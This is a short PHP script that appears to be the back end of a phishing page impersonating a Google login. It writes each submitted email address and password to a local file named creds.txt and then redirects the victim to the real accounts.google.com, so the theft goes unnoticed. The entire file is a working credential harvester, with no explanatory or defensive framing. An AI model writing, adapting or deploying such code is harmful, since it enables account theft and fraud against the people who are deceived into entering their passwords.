<?php
file_put_contents("creds.txt", "[**] Username: " . $_POST['email'] . " Pass: " . $_POST['password']);
header('Location: https://accounts.google.com/');
exit();
?>
